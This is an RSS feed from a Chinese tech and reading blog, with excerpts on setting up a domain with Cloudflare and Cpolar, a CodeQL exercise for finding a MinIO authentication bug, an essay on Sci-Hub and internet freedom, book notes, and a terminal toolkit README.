<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Posts on ch3n9w の 超元域</title>
    <link>https://dragonbox.top/posts/</link>
    <description>Recent content in Posts on ch3n9w の 超元域</description>
    <generator>Hugo -- 0.140.1</generator>
    <language>en-us</language>
    <lastBuildDate>Sun, 08 Dec 2024 17:33:39 +0800</lastBuildDate>
    <atom:link href="https://dragonbox.top/posts/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>域名配合隧道穿透服务(Godaddy&#43;Cloudflare&#43;Cpolar)</title>
      <link>https://dragonbox.top/posts/tech-domain/</link>
      <pubDate>Sun, 08 Dec 2024 17:33:39 +0800</pubDate>
      <guid>https://dragonbox.top/posts/tech-domain/</guid>
      <description>&lt;h1 id=&#34;记录一次域名购买并使用在隧道服务的经历&#34;&gt;记录一次域名购买并使用在隧道服务的经历&lt;/h1&gt;
&lt;h2 id=&#34;godaddy-域名购买&#34;&gt;Godaddy 域名购买&lt;/h2&gt;
&lt;p&gt;其实Godaddy的域名还是偏贵的&amp;hellip; 但一年50块钱的top域名还算可以接受就是了, 而且不用像在国内购买域名一样要实名制, 而且支持支付宝, 挺ok的.&lt;/p&gt;
&lt;h2 id=&#34;cloudflare-域名托管&#34;&gt;Cloudflare 域名托管&lt;/h2&gt;
&lt;p&gt;在购买域名完成之后, 我发现Godaddy是不允许为主域名设置CNAME的, 这就有点不能接受, 然而师弟告诉我Cloudflare可以, 遂用其托管.&lt;/p&gt;
&lt;p&gt;点击添加域名, 填入在Godaddy购买的域名&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;./adddomain.png&#34; alt=&#34;add domain&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;点击Continue, 等到Cloudflare发现Godaddy下的dns记录, 继续, 看到套餐页面选择免费的套餐就可以了, 之后选择复制Cloudflare给出的ns记录.&lt;/p&gt;
&lt;p&gt;来到Godaddy的控制台, 在DNS -&amp;gt; Nameservers 下面选择改变nameservers, 将Cloudflare给出的ns记录复制进去, 保存后等待Cloudflare页面将域名的状态更新为Active, 这样托管就完成了.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;./nameservers.png&#34; alt=&#34;nameservers&#34;  /&gt;
&lt;/p&gt;
&lt;h2 id=&#34;cpolar使用自定义域名&#34;&gt;Cpolar使用自定义域名&lt;/h2&gt;
&lt;p&gt;接下来就是将域名解析到Cpolar提供的隧道中了, 进入Cpolar的控制面板, 点击自定义域名, 创建一个cname记录.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;./cpolar-cname.png&#34; alt=&#34;cname&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后在Cloudflare的DNS面板中为主域名添加这条CNAME, 这样就可以把主域名解析到cpolar提供的隧道中了.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;./cloudflare-cname.png&#34; alt=&#34;Cloudflare cname&#34;  /&gt;
&lt;/p&gt;
&lt;h2 id=&#34;tlsssl-证书&#34;&gt;TLS/SSL 证书&lt;/h2&gt;
&lt;p&gt;在Cloudflare的Origin Server中, 点击创建证书, 不得不感叹Cloudflare的良心, 在国内云厂商纷纷对SSL证书收费的情况下, Cloudflare能够提供15年有效期的免费证书, 真的友好.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;./ssl.png&#34; alt=&#34;ssl&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;申请完毕之后将证书和密钥下载下来, 进入本地的Cpolar服务面板, 新建隧道并上传证书后启动即可, 如图所示.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;./ssl-cpolar.png&#34; alt=&#34;ssl cpolar&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;PS: 另外, 在高级选项中, 似乎HTTP绑定方式必须为同时启动, 并且重定向到HTTPS这一项需要设置为false, 否则会出现404的情况, 不知道为什么.&lt;/p&gt;</description>
    </item>
    <item>
      <title>CodeQL CTF 之 Go and don&#39;t return</title>
      <link>https://dragonbox.top/posts/sec-codeql-ctf/</link>
      <pubDate>Fri, 06 Dec 2024 09:03:06 +0800</pubDate>
      <guid>https://dragonbox.top/posts/sec-codeql-ctf/</guid>
      <description>&lt;h1 id=&#34;go-and-dont-return&#34;&gt;Go and don&amp;rsquo;t return&lt;/h1&gt;
&lt;p&gt;这道题目从MinIO的一个已公开的未授权访问漏洞开始, 通过编写并慢慢完善CodeQL语句来检测该漏洞在代码中的位置. 随着题目的进行, 题目将目标将扩展到此类漏洞的各种变种, 难度逐渐加深, 非常适合用来入门和学习. 本文是用来记录我在阅读官方题解时的思考过程, 因为我在Part2就卡住啦hhhhhhh.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://securitylab.github.com/ctf/go-and-dont-return/&#34;&gt;🔗原题目链接&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://securitylab.github.com/ctf/go-and-dont-return/answers/&#34;&gt;🔗官方参考题解链接&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在开始之前, 可以查看一下该漏洞的&lt;a href=&#34;https://github.com/minio/minio/commit/4cd6ca02c7957aeb2de3eede08b0754332a77923&#34;&gt;细节&lt;/a&gt; 和 &lt;a href=&#34;https://github.com/minio/minio/security/advisories/GHSA-xv4r-vccv-mg4w&#34;&gt;描述&lt;/a&gt;, 发现该漏洞的原理其实十分简单, 就是在 &lt;code&gt;if s3Err != ErrNone&lt;/code&gt; 判断之后没有将不合法的控制流返回, 而是任由它继续进入接下去的&lt;code&gt;claims, s3Err := checkClaimsFromToken(r, cred)&lt;/code&gt;, 导致校验失败.&lt;/p&gt;
&lt;p&gt;具体的漏洞利用可以看&lt;a href=&#34;https://github.com/cokeBeer/go-cves/blob/main/CVE-2020-11012/CVE-2020-11012.md&#34;&gt;这里&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;part-1-lets-catch-the-bug&#34;&gt;Part 1: Let’s catch the bug!&lt;/h2&gt;
&lt;h3 id=&#34;11-finding-references-to-errnone&#34;&gt;1.1: Finding references to ErrNone&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Write the query that finds all identifiers named ErrNone. You will find in the documentation the relevant object types to query. Your query should return 231 results.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-ql&#34; data-lang=&#34;ql&#34;&gt;
import go

from Ident i
where i.getName() = &amp;#34;ErrNone&amp;#34; //Ident就是标识符
select i
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;运行后就可以检索出ErrNone出现过的所有位置.&lt;/p&gt;</description>
    </item>
    <item>
      <title>从$scihub到自由网络意志</title>
      <link>https://dragonbox.top/posts/gossip-scihub/</link>
      <pubDate>Wed, 20 Nov 2024 19:32:58 +0800</pubDate>
      <guid>https://dragonbox.top/posts/gossip-scihub/</guid>
      <description>&lt;p&gt;2024年11月16日到20号，不太平静的MEME圈中发生了一件有趣的事情。简单来说，一个北大出身的大V(0xAA_Science)发现了一个已经被原始开发者脱手的meme: scihub，并意识到了这是一个好机会，或许是帮助DeSci(去中心化学术)的好机会，亦或是赚钱的好机会，当然，更有可能的是二者兼有，总之，他购入了20%的scihub代币，并联系Scihub的创始人 Alexandra Elbakyan 计划分批次将代币捐赠。&lt;/p&gt;
&lt;p&gt;一开始，Alexandra 的态度是合理的质疑，一方面，分批次的捐助很难不让人起疑心; 另一方面，对于不怎么关注币圈的她来说，将代币冠以scihub的名字在市场上流通，很难不让人觉得这是一种亵渎，尤其是以知识平权为目标的scihub。&lt;/p&gt;
&lt;p&gt;而对于常年混迹web3的投资客们，这种行为也无异于巧妙的营销: DeSci的理念和背靠的扎实项目，让$scihub的叙事成为了乱七八糟的meme众生中的一股清流，而且通过捐助行为，让这个原本无人问津的代币与scihub的联系从仅仅同名上升到了利益相关。在今天的代币海洋，哪怕多几个人喊喊口号炒作炒作故事和概念都可以让代币一飞冲天，更别提如果背靠扎实而具体并且运营多年的项目了。&lt;/p&gt;
&lt;p&gt;好了，关于币圈的内容先暂停，现在谈谈所谓的DeSci概念的源头: 网络自由意志主义。&lt;/p&gt;
&lt;p&gt;与其他平权运动相同，知识平权也起源于自由意志主义，在互联网黑客中，这体现为网络自由意志主义，其重点在于，减少政府管制审查或其他干涉互联网&amp;quot;自由&amp;quot;的行为。在当时，新兴的互联网通讯技术令政府处于认知混乱的状态，在执法过程中出现了不少侵犯个人自由的案例。&lt;/p&gt;
&lt;p&gt;在此背景下，约翰·吉尔摩等人于1970年成立了电子前线基金会 (Electronic Frontier Foundation)，其主要使命是:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;帮助公众了解更多有关计算机和通信领域发展带来的机遇与挑战&lt;/li&gt;
&lt;li&gt;促使政策制定者对那些构成通信的自由和开放的基本问题有更好的了解&lt;/li&gt;
&lt;li&gt;提高公众对随新计算机通信媒介迅速发展而产生的公民自由问题的认识&lt;/li&gt;
&lt;li&gt;为那些受到毫无根据或误导的法律威胁的新技术和个人进行辩护&lt;/li&gt;
&lt;li&gt;鼓励和支持新技术的开发，帮助非技术用户可不受任何影响且方便地接触到新通信技术&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;电子前线基金会为推进当时的互联网自由发挥过不少作用，但更重要的是，它为当时为数不多但在日后具备更多互联网话语权的技术极客们或多或少地传递了自己的理念， 这其中就包括Reddit的联合创始人，同时也是RSS格式和Markdown格式的开发者，“互联网之子” Aaron Hillel Swartz。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;./aaron.jpg&#34; alt=&#34;Aaron&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;受EFF的影响，Aaron在年少的时候就积极参与网络自由相关的事业：14岁参与开发RSS1.0版本，帮助创办了先进社会变革活动委员会，成功制止《禁止网络盗版法案》的颁布等等。&lt;/p&gt;
&lt;p&gt;2008年时，Aaron 做出了一个轰动一时的举动：从政府的收费数据库系统中下载了大约270万份联邦法院的文件并让网络大众免费访问。不过按照法律，政府文件不受版权法保护，这些文件原本就是应该公开的，因此即便受到了FBI的调查，Aaron也没有被控告。“幸运” 的他继续在英文维基百科中进行着从2003年以来的编辑活动，在美国政治机构、政府官员等主题上添加了许多条目。&lt;/p&gt;
&lt;p&gt;直到他自杀的那一天。&lt;/p&gt;
&lt;p&gt;2011年1月6日晚，斯沃茨在哈佛大学校园附近被警察和特工逮捕， 他们发现 Aaron 通过MIT的校园网下载了大量的期刊文章，因此以非法从受保护的计算机中获取信息的罪名检控 Aaron。 而在联邦检察官的介入下，Aaron 新增了九项重罪，面临最高50年的监禁和100万罚款! 在压力下，Aaron选择了上吊。&lt;/p&gt;
&lt;p&gt;Aaron的死亡无疑代表了当时美国司法系统中的过分检控和恐吓，更重要的是，他成为了一个符号，一个殉道者，他的死亡激起了全社会各界的广泛关注。人们在白宫网站上要求罢免为Aaron新增罪名的检察官，艺术界用各种涂鸦和壁画纪念他，黑客们攻入了MIT和政府的网站，将页面替换为了对Aaron的纪念和哀悼。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;./art.jpg&#34; alt=&#34;纪念&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;Aaron的死所带来的最深远影响，便是刺激了越来越多的人和组织参与到了开放获取和知识平权中的运动上来，以至于Journal of Library Administration 的一位编委会成员写道，在Aaron死后，“在非开放获取刊物上发表要受到良知的谴责”。可以说Scihub就是这股运动的继承者。&lt;/p&gt;
&lt;p&gt;与其他鼓吹scihub的言论相比，我并不是很看重它在免费获取论文上的效果，就个人的有限体验而言，我查询的文献中依旧有很大一部分是scihub没有收录的，而研究生期间，通过学校的校园网就可以下载到那些需要付费订阅的论文，也没有使用scihub的刚需，不过它的存在和发展依旧是值得被认可和支持的，不仅仅是为了它为了那些没有条件的科研人员做出的虽然有限但切实存在的平权努力，更是为了那份传承了三十余年的精神图腾，它让人们在陈腐的商业世界中，依旧能够看到理想主义和早期互联网自由精神的余辉。&lt;/p&gt;
&lt;p&gt;当然，Alexandra 依旧面临着严峻的知识封锁和法律风险，以及更现实的经济问题。尽管有不少志愿者试图传播和帮助Scihub，但范围有限，效果甚微， 部分原因在于，互联网的新生一代正逐渐掌握话语权，而他们生活在一个被前辈&amp;quot;修正&amp;quot;过了的网络世界， 没有经历过矛盾的冲突和历史性的运动，缺乏对网络自由意志主义的认知和体会，最多便是称道一声Respect。 好比只有当你是上世纪三四十年代的中国农民时，才能真正体会到今天政治书里的陈词滥调在当年确实是救国图存的存在。&lt;/p&gt;
&lt;p&gt;社会的健忘不仅为知识平权带来了困难，也让其他曾经被&amp;quot;修复&amp;quot;过的那些问题重新浮现，甚至变得更加高明和棘手，因为政府和商业公司已经学会温水煮青蛙的模式慢慢侵犯用户，而时间和健忘是他们的盟友。试问有谁记得谷歌曾经在自己的行为准则开头中承诺过&amp;quot;Don&amp;rsquo;t be evil&amp;quot;呢? 大部分的人仅仅关心自己的需求能不能满足，至于那&amp;quot;小小&amp;quot;的隐私侵犯? 或许让人不快，但那又如何?&lt;/p&gt;
&lt;p&gt;可以说，互联网的历史，就是人们用隐私和自由换取便利的历史，即便这种交易有时候并不等价。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;./google.png&#34; alt=&#34;google&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;回到web3，这是一个黑暗森林，也是一个充满了机会的地方。除了为Scihub的推广带来了便利之外，去中心化技术的本质核心，也就是加密技术，同样是当年网络自由意志主义的产物，其背后的一些故事也同样颇具传奇色彩。&lt;/p&gt;
&lt;p&gt;1991年，菲尔·齐默曼为了让所有人可以安全访问BBS和存储信息，开发了用于通讯加密的应用程序PGP(Pretty Good Privacy)并发布在互联网上供人免费使用。而在当时的美国，使用大于40位密钥的加密系统被视为军需品。PGP的密钥长度远远超出了这一限制，因此政府以&amp;quot;没有授权的军需品出口&amp;quot;为名对他发起调查，但齐默曼使用了一个天才般的想法去对抗规定: 他将PGP的源代码出版为一本书。&lt;/p&gt;
&lt;p&gt;与军需品出口不同，书本出口和传播符合美国宪法第一修正案中的言论自由部分，因而受到保护，法院因此判定齐默曼无罪。这个案件深刻影响了后来类似案件的司法裁定，而PGP依旧继续发挥着隐私保护的强大作用，它的后辈GPG (GnuPG) 帮助 Edward Joseph Snowden 在逃亡期间联系新闻界，一举揭发了2013年引爆全球的美国棱镜计划。&lt;/p&gt;</description>
    </item>
    <item>
      <title>《在世界尽头的咖啡馆》读书笔记</title>
      <link>https://dragonbox.top/posts/read-the-why-cafe/</link>
      <pubDate>Sat, 02 Nov 2024 20:50:43 +0800</pubDate>
      <guid>https://dragonbox.top/posts/read-the-why-cafe/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;小说的主人公在偶遇一间奇妙的咖啡馆后, 通过店员们的引导开始思考起了人生的意义和价值, 并最终得到了启发.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;这里记录书中几个有意思的片段.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;有意义的三个问题:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;你为什么来这里&lt;/li&gt;
&lt;li&gt;你害怕死亡吗&lt;/li&gt;
&lt;li&gt;你满足吗&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;提出问题, 人的心灵才会去追寻答案&lt;/p&gt;
&lt;p&gt;每一天都是一个实现人生意义的机会，可以做我想做的事。不需要等到‘退休’&lt;/p&gt;
&lt;p&gt;我们每天都暴露在大量营销信息中，如果不谨慎点儿，我们肯定会把自己的幸福和满足寄托在某样产品或服务上。最后，我们会陷入一种财务困境，必须不断去做事情去挣钱，尽管那些事情不是我们真正想做的。而这会造成恶性循环&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;转变心态的重点在于，你要清楚，某样东西是否能让你的生活更圆满，由你自己说了算，和别人告诉你它圆不圆满无关。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;想想, 如果我不需要‘逃离’或 ‘减压’，那我还会想买那些东西吗？如果我一直在做我想做的事，那么我应该没什么可‘逃离’的，也没那么多压力需要释放, 那么我真的需要通过工作去赚那么多钱吗?&lt;/p&gt;
&lt;p&gt;沉浸在爱好中的大多数人根本就不太关心自己运气好不好。他们只知道，当自己为实现存在意义而努力时，幸运的巧合就会自然出现，他们管这个叫顺其自然。&lt;/p&gt;
&lt;p&gt;有很多人为了钱或权力，说服其他人去相信，他们的产品或服务是实现人生圆满的关键。想象一下，如果大家都意识到，我们的满足感其实掌握在自己手中，那前面那种人就会受到巨大的威胁。说服他人的那些人将失去他们的力量。对于这类人，失去对他人的影响力可不是什么好事情。&lt;/p&gt;
&lt;p&gt;只有你真正了解自己存在的意义。永远不要因为其他人或事失去对自己命运的掌控。要积极地选择自己的人生道路，不然就只能被动接受安排。&lt;/p&gt;
&lt;p&gt;如何寻找人生意义和热爱的事物:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;人生意义的答案，全世界只有我们自己可以决定。所以很多人都在追寻答案的过程中选择&lt;strong&gt;独处&lt;/strong&gt;。要是你整天被资讯和信息轰炸，就很难集中精力思考问题。&lt;/li&gt;
&lt;li&gt;多去接触不同的新鲜事物。有人发现，一旦他们有新体验或者接触到新理念，有些体验或理念就会让他们产生共鸣。遇到他们热爱的事物时，很多人都有生理反应，比如汗毛倒竖、脊梁骨仿佛触电、喜极而泣等等。还有人会产生一种‘就是它’的感觉。这些都是找出自己存在意义的线索。&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>终端工具集(2024)</title>
      <link>https://dragonbox.top/posts/tech-dev-2024/</link>
      <pubDate>Sat, 26 Oct 2024 09:11:56 +0800</pubDate>
      <guid>https://dragonbox.top/posts/tech-dev-2024/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;声明: 此项目与那些声称要取代vscode等GUI工具的配置不同, 而是力图填补这些大型开发工具在终端环境下的空白&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;项目地址: &lt;a href=&#34;https://github.com/ch3n9w/dev&#34;&gt;https://github.com/ch3n9w/dev&lt;/a&gt;, 后续README更新不会同步到这篇博客, 但是大体上秉承的思想不会改变: 极简、可用以及最少化心智负担&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&#34;development-toolkit-&#34;&gt;Development Toolkit 📡&lt;/h1&gt;
&lt;p&gt;A comprehensive and user-friendly development toolkit to boost up your productivity 🚀.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://ch3n9w.github.io/posts/tech-dev-2024/cover.png&#34; alt=&#34;Screenshot&#34;  /&gt;
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;terminal emulator: &lt;a href=&#34;https://github.com/kovidgoyal/kitty&#34;&gt;kitty&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;shell: &lt;a href=&#34;https://www.zsh.org/&#34;&gt;zsh&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;editor: &lt;a href=&#34;https://github.com/neovim/neovim&#34;&gt;neovim&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;terminal filemanager: &lt;a href=&#34;https://github.com/sxyazi/yazi&#34;&gt;yazi&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;multiplexers: &lt;a href=&#34;https://github.com/tmux/tmux&#34;&gt;tmux&lt;/a&gt; or &lt;a href=&#34;https://github.com/kovidgoyal/kitty&#34;&gt;kitty&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;try&#34;&gt;Try&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker run -it --rm --name dev ch4xer/dev:latest /bin/zsh
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;install&#34;&gt;Install&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git clone https://github.com/ch3n9w/dev
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cd dev
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# install dependency software and install configuration&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./scripts/install-software.sh
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Alternatively (if you dont want to install all of them), you can copy the configuration directory you like to &lt;code&gt;XDG_CONFIG_HOME&lt;/code&gt; (commonly &lt;code&gt;~/.config&lt;/code&gt;), for example:&lt;/p&gt;</description>
    </item>
    <item>
      <title>《如何阅读一本书》读书笔记</title>
      <link>https://dragonbox.top/posts/read-how-to-read-a-book/</link>
      <pubDate>Fri, 25 Oct 2024 23:26:18 +0800</pubDate>
      <guid>https://dragonbox.top/posts/read-how-to-read-a-book/</guid>
      <description>&lt;p&gt;这本书主要介绍了在进行以提升理解力为目的的阅读时所应该掌握的技巧, 这些技巧可以帮助提升阅读的效率, 节约时间的同时抓住重点. 注意, 这些技巧并不会让阅读变得更轻松, 相反, 读者消耗的精力可能会更多, 因为这些技巧要求读者更多地发挥其主动性, 然而, 这些技巧能够帮助读者更好地提升自己的理解力和知识吸收的速度, 并且有针对性地运用有限的精力.&lt;/p&gt;
&lt;p&gt;本书并不谈论以消遣为目的的阅读活动, 也不会谈论单纯以获取资讯为目的的阅读活动, 尽管在提升理解力后, 获取资讯会更加迅速.&lt;/p&gt;
&lt;h2 id=&#34;四个层次的阅读&#34;&gt;四个层次的阅读&lt;/h2&gt;
&lt;p&gt;阅读的四个层次, 这几个层次是相互包含, 层层递进的:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;基础阅读&lt;/strong&gt;: 熟悉理解并掌握词语和句子的意思&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;检视阅读&lt;/strong&gt;: 在规定时间内从宏观层面上理解书中的重点, 从而判断值不值得读
&lt;ol&gt;
&lt;li&gt;系统性略读
&lt;ol&gt;
&lt;li&gt;阅读书名 序言 目录&lt;/li&gt;
&lt;li&gt;从目录中挑几个与主题相关的篇章, 仔细阅读开头和结尾处的摘要说明&lt;/li&gt;
&lt;li&gt;随便翻翻全书, 随时寻找主要论点, 不要忽略最后的两三页&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;粗浅阅读
&lt;ol&gt;
&lt;li&gt;从头到尾先读完一遍, 碰到不懂的地方不要停下来查询或思考, 只注意你能理解的地方, 不要为了一些没能立刻理解的地方而停顿, 这样就不会拘泥于局部&lt;/li&gt;
&lt;li&gt;克服在🧠大脑中念出声的阅读方式, 头脑和眼睛不一样, 并不需要一次只&amp;quot;读&amp;quot;一个字或者句子 =&amp;gt; 利用手指在书页上的移动来引导眼睛和大脑&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;分析阅读&lt;/strong&gt;: 全盘完整的阅读 (不完全适用于小说和诗集)
&lt;ol&gt;
&lt;li&gt;阶段一
&lt;ol&gt;
&lt;li&gt;为书籍分类(小说?爱情小说?论说类?经济学?历史?哲学?) =&amp;gt; 什么类型的房子&lt;/li&gt;
&lt;li&gt;用几句话叙述整本书的内容 =&amp;gt; 房子的整体功能(整体性)&lt;/li&gt;
&lt;li&gt;将重要篇章列举出来, 说明它们如何形成了整体 =&amp;gt; 砖瓦的功能和联系(复杂性)&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;阶段二
&lt;ol&gt;
&lt;li&gt;找出关键字, 确认每个字不同意义之间的转换, 与作者找出共通的语义&lt;/li&gt;
&lt;li&gt;重新架构作者论述的前因后果&lt;/li&gt;
&lt;li&gt;确定作者解决了什么问题, 还有哪些问题没有解决&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;阶段三: 对书本下评论&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;主题阅读&lt;/strong&gt;: 面对一本书时去阅读许多同类型的其他书籍, 并相互对比
&lt;ol&gt;
&lt;li&gt;针对主题设计实验性书目, 找出并确定相关的书籍&lt;/li&gt;
&lt;li&gt;阅读这些书籍的相关章节&lt;/li&gt;
&lt;li&gt;建立中立的主旨和词汇, 列出一连串相关的问题&lt;/li&gt;
&lt;li&gt;界定每个作者研究的主要和次要议题&lt;/li&gt;
&lt;li&gt;分析这些讨论。这得把问题和议题按顺序排列，以求突显主题&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;所谓阅读速度, 不只是要能读得快, 还要能用不同的速度来阅读, 要知道什么时候用什么速度是恰当的.&lt;/p&gt;</description>
    </item>
    <item>
      <title>《高效原力》读书笔记</title>
      <link>https://dragonbox.top/posts/read-feel-good-productivity/</link>
      <pubDate>Tue, 22 Oct 2024 19:58:09 +0800</pubDate>
      <guid>https://dragonbox.top/posts/read-feel-good-productivity/</guid>
      <description>&lt;p&gt;这本书主要讨论了如何在工作过程中保持愉悦的心态, 进而提升工作效率, 保护精神健康. 作者认为愉悦心态可以帮助克服焦虑和过度的压力, 成功不会让你感觉愉悦, 但是感觉愉悦会为你带来成功.&lt;/p&gt;
&lt;p&gt;本书内容分为三个部分: 激励(让工作更有兴致) 解锁(消除面对工作时的负面情绪) 续航(通过良好的习惯克服倦怠感)&lt;/p&gt;
&lt;h2 id=&#34;激励&#34;&gt;激励&lt;/h2&gt;
&lt;h3 id=&#34;游戏化思维&#34;&gt;游戏化思维&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;有趣的游戏化体验会带来愉悦&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;选择一个游戏性格, 找出最能与你产生共鸣的游戏状态, 并有意识的把自己当作这个角色来对待工作, 代入一场冒险&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;收藏家：喜欢收集和整理物品，喜欢寻找珍稀植物、拍卖档案馆或车库中的珍宝等活动。&lt;/li&gt;
&lt;li&gt;竞争者：喜欢游戏和体育赛事，以全力以赴和获胜为乐。&lt;/li&gt;
&lt;li&gt;探索者：喜欢徒步旅行、公路旅行和其他探索活动，喜欢行走和发现新的地方和从未见过的事物。&lt;/li&gt;
&lt;li&gt;创造者：在创造中找到快乐，每天可以花几个小时涂鸭、绘画、制作音乐、园艺等。&lt;/li&gt;
&lt;li&gt;讲故事的人：想象力丰富，能用自己的想象力取悦他人。他们喜欢写作、舞蹈、戏剧和角色扮演。&lt;/li&gt;
&lt;li&gt;小丑：努力逗人发笑，可能会通过倒立、即兴表演或恶作剧逗你发笑。&lt;/li&gt;
&lt;li&gt;导演：喜欢策划、组织和领导他人，能胜任各种角色和活动，从导演舞台剧到管理公司，再到参与政治或社会运动。&lt;/li&gt;
&lt;li&gt;动觉型： 在杂技、体操和自由跑等体育活动中找到乐趣。&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;善于运用好奇的力量, 当被问到让人好奇的问题的时候, 大脑会开始分泌多巴胺, 更让人专注&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;工作时候多问问自己问题&lt;/li&gt;
&lt;li&gt;每天除了日常任务之外给自己增加一个让人好奇的支线任务: 探索新的软件 学习新的编程语言 学习新的模型, 给玩心创造空间&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;多问问自己, 怎么样能让这个任务变得更加有趣? 要更加专注于任务过程带来的乐趣, 而不是结果.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;压力会降低游戏的能力, 也会降低生产力, 这意味着为了激发玩心, 我们不只需要追求冒险和寻找乐趣, 还需要努力创造一个低风险能让人放松的环境&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;学习黑暗之魂的思路去看待失败, 将失败看作是冒险中不可分割的一部分, 是尝试新事物的实验, 是成功路上的必经之路, 是隐形的进步&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;多提醒提醒自己, 不要过于严肃, 而是真诚以对&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;好比玩一场大富翁游戏, 无所谓的心态自然无法玩好, 过于严肃对得失斤斤计较则无论过程是否顺利都体会不到乐趣, 只有真诚对待游戏, 全心投入每一个过程却又不计较得失, 才能开怀大笑. (很重要)&lt;/p&gt;
&lt;h3 id=&#34;自我赋权&#34;&gt;自我赋权&lt;/h3&gt;
